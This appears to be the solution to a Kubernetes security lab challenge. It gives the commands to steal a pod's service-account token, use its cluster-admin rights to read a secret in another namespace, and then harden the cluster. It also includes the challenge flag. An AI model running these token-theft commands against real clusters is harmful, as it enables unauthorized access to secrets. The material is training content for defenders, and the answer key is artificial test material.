# Red Team Lab Boss — Solution

## Attack Phase

### Step 1: Get a Shell in exposed-app

```bash
POD=$(kubectl get pod -n dojo-sec-boss -l app=exposed-app -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n dojo-sec-boss "$POD" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/boss-token
```

### Step 2: Discover What This Token Can Do

```bash
BOSS_TOKEN=$(cat /tmp/boss-token)
kubectl --token=$BOSS_TOKEN auth can-i get secrets -n dojo-sec-boss-vault
# yes  ← cluster-admin!
```

### Step 3: Read the Crown Jewels

```bash
kubectl --token=$BOSS_TOKEN get secret crown-jewels -n dojo-sec-boss-vault \
  -o jsonpath='{.data.secret}' | base64 -d
# crown-jewels-value-attack-found-this
```

### Record the Attack Progress

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: attack-progress
  namespace: dojo-sec-boss
data:
  step1: "read-sa-token"
  step2: "found-cluster-admin"
  step3: "read-crown-jewels"
EOF
```

---

## Hardening Phase

### Remove the Dangerous CRB

```bash
kubectl delete clusterrolebinding dangerous-crb
```

### Disable SA Token Auto-mounting

```bash
kubectl patch serviceaccount default -n dojo-sec-boss \
  -p '{"automountServiceAccountToken": false}'
# Restart the deployment so new pods don't get a token
kubectl rollout restart deployment/exposed-app -n dojo-sec-boss
```

### Add Default-Deny NetworkPolicy

```bash
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: dojo-sec-boss
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
EOF
```

### Rotate the Crown Jewels

```bash
kubectl delete secret crown-jewels -n dojo-sec-boss-vault
kubectl create secret generic crown-jewels \
  -n dojo-sec-boss-vault \
  --from-literal=secret="$(openssl rand -base64 32)"
```

---

## Run the Verifier

```bash
bash verify.sh
```

**Flag: `KUBE{full_kill_chain_owned_then_hardened}`**

---

## Summary

You just:
1. **Exploited** a default SA with cluster-admin access
2. **Pivoted** across namespaces using the stolen token
3. **Exfiltrated** the crown jewels secret
4. **Removed the backdoor** (dangerous ClusterRoleBinding)
5. **Prevented future attacks** (token auto-mount disabled, NetworkPolicy deployed)
6. **Rotated the compromised secret** (crown jewels now have a new value)

That's the complete attacker and defender cycle. Apply these skills ethically.
